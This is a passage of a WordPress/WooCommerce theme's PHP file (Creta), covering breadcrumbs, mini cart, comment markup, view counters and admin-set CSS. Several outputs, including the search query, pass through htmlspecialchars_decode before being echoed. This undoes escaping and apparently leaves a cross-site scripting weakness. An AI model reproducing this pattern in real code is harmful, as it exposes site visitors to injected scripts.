                    $parent_id = $page->post_parent;
                }

                $breadcrumbs = array_reverse($breadcrumbs);

                foreach ($breadcrumbs as $crumb) {
                    echo htmlspecialchars_decode($before . $crumb . $delimiter . $after);
                }

                echo htmlspecialchars_decode($before . $linkbefore . get_the_title() . $linkafter . $after);

            } elseif (is_search()) {

                echo htmlspecialchars_decode($before . $linkbefore . esc_html__('Search results for &ldquo;', 'creta') . get_search_query() . '&rdquo;' . $linkafter . $after);

            } elseif (is_tag()) {

                if ('post' == get_post_type() && get_option('show_on_front') == 'page') {
                    echo htmlspecialchars_decode($before . '<a href="' . esc_url(get_permalink(get_option('page_for_posts'))) . '">' . esc_html(get_the_title(get_option('page_for_posts', true))) . '</a>' . $delimiter . $after);
                }

                echo htmlspecialchars_decode($before . $linkbefore . esc_html__('Posts tagged &ldquo;', 'creta') . single_tag_title('', false) . '&rdquo;' . $linkafter . $after);

            } elseif (is_author()) {

                $userdata = get_userdata($author);
                echo htmlspecialchars_decode($before . $linkbefore . esc_html__('Author:', 'creta') . ' ' . $userdata->display_name . $linkafter . $after);

            } elseif (!is_single() && !is_page() && get_post_type() != 'post') {

                $post_type = get_post_type_object(get_post_type());

                if ($post_type) {
                    echo htmlspecialchars_decode($before . $linkbefore . $post_type->labels->singular_name . $linkafter . $after);
                }

            }

            if (get_query_var('paged')) {
                echo htmlspecialchars_decode($before . $linkbefore . '&nbsp;(' . esc_html__('Page', 'creta') . ' ' . get_query_var('paged') . ')' . $linkafter . $after);
            }

            echo '</ul>';
        } else {
            if (is_home() && !is_front_page()) {
                echo '<ul class="breadcrumb">';

                if (!empty($home)) {
                    echo htmlspecialchars_decode($before . '<a class="home" href="' . esc_url(home_url()) . '">' . $home . '</a>' . $delimiter . $after);


                    echo htmlspecialchars_decode($before . $linkbefore . single_post_title('', false) . $linkafter . $after);
                }

                echo '</ul>';
            }
        }
    }


    // magik mini cart
    function magikCreta_mini_cart()
    {
        global $woocommerce, $creta_Options;

        ?>
        <li class="nav-item mini-cart">

            <?php if (isset($creta_Options['theme_layout'])) { ?>
                <a class="nav-link item-counter" href="<?php echo esc_url(wc_get_cart_url()); ?>">
                    <i class="fa fa-shopping-basket" aria-hidden="true"></i>
                    <span class="item-number"> <?php echo esc_html($woocommerce->cart->cart_contents_count); ?> </span>
                    <span><?php //echo htmlspecialchars_decode(WC()->cart->get_cart_subtotal()); ?></span>
                </a>

            <?php } ?>
        </li>
        <?php
    }


    // bottom cpyright text
    function magikCreta_footer_text()
    {
        global $creta_Options;
        if (isset($creta_Options['bottom-footer-text']) && !empty($creta_Options['bottom-footer-text'])) {
            echo htmlspecialchars_decode($creta_Options['bottom-footer-text']);
        }
    }


    function magikCreta_getPostViews($postID)
    {
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);
        if ($count == '') {
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
            return "0  View";
        }
        return $count . '  Views';
    }

    function magikCreta_setPostViews($postID)
    {
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);
        if ($count == '') {
            $count = 0;
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
        } else {
            $count++;
            update_post_meta($postID, $count_key, $count);
        }
    }


    function magikCreta_is_blog()
    {
        global $post;
        $posttype = get_post_type($post);
        return (((is_archive()) || (is_author()) || (is_category()) || (is_home()) || (is_single()) || (is_tag())) && ($posttype == 'post')) ? true : false;
    }

    //add to cart function
    function magikCreta_woocommerce_product_add_to_cart_text()
    {
        global $product;
        /**
         * woocommerce_after_shop_loop_item hook
         *
         * @hooked woocommerce_template_loop_add_to_cart - 10
         */
        do_action('woocommerce_after_shop_loop_item');
    }

    // comment display
    function magikCreta_comment($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment; ?>

        <li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
            <div class="comment-body">
                <div class="img-thumbnail">
                    <?php echo get_avatar($comment, 80); ?>
                </div>
                <div class="comment-block">
                    <div class="comment-arrow"></div>
                    <span class="comment-by">
          <strong><?php echo get_comment_author_link() ?></strong>
          <span class="pt-right">
            <span> <?php edit_comment_link('<i class="fa fa-pencil"></i> ' . esc_html__('Edit', 'creta'), '  ', '') ?></span>
            <span> <?php comment_reply_link(array_merge($args, array('reply_text' => '<i class="fa fa-reply"></i> ' . esc_html__('Reply', 'creta'), 'add_below' => 'comment', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?></span>
          </span>
        </span>
                    <div>
                        <?php if ($comment->comment_approved == '0') : ?>
                            <em><?php echo esc_html__('Your comment is awaiting moderation.', 'creta') ?></em>
                            <br/>
                        <?php endif; ?>
                        <?php comment_text() ?>
                    </div>
                    <span class="date pt-right"><?php printf(esc_html__('%1$s at %2$s', 'creta'), get_comment_date(), get_comment_time()) ?></span>
                </div>
            </div>
        </li>
    <?php }

    //css manage by admin
    function magikCreta_enqueue_custom_css()
    {
        global $creta_Options;

        ?>
        <style rel="stylesheet" property="stylesheet" type="text/css">
            <?php if(isset($creta_Options['opt-color-rgba']) &&  !empty($creta_Options['opt-color-rgba'])) {
            ?>
            .mgk-main-menu {
                background-color: <?php echo esc_html($creta_Options['opt-color-rgba'])." !important";
      ?>
            }

            <?php
            }
            ?>

            <?php if(isset($creta_Options['footer_color_scheme']) && $creta_Options['footer_color_scheme']) {
            if(isset($creta_Options['footer_copyright_background_color']) && !empty($creta_Options['footer_copyright_background_color'])) {
             ?>
            .footer-bottom {
                background-color: <?php echo esc_html($creta_Options['footer_copyright_background_color'])." !important";
       ?>
            }

            <?php
             }
             ?>
            <?php if(isset($creta_Options['footer_copyright_font_color']) && !empty($creta_Options['footer_copyright_font_color'])) {
             ?>
            .coppyright {
                color: <?php echo esc_html($creta_Options['footer_copyright_font_color'])." !important";
      ?>
            }

            <?php
             }
             ?>
            <?php
             }
             ?>
            <?php
            if (isset($creta_Options['theme_layout']) && $creta_Options['theme_layout']=='version2') {
           if(isset($creta_Options['header_breadcrumb']) && !empty($creta_Options['header_breadcrumb']['url'])) {
          ?>
            .page-heading, .tax-product_cat .page-heading {
                background-image: url("<?php echo esc_url($creta_Options['header_breadcrumb']['url']);?>");
            }

            <?php
          }
           }
           ?>
        </style>
        <?php
    }
}

// [product_count] shortcode
function product_count_shortcode()
{
    $count_posts = wp_count_posts('product');
    return $count_posts->publish;
}

add_shortcode('product_count', 'product_count_shortcode');
// Instantiate theme
$MagikCreta = new MagikCreta();

?>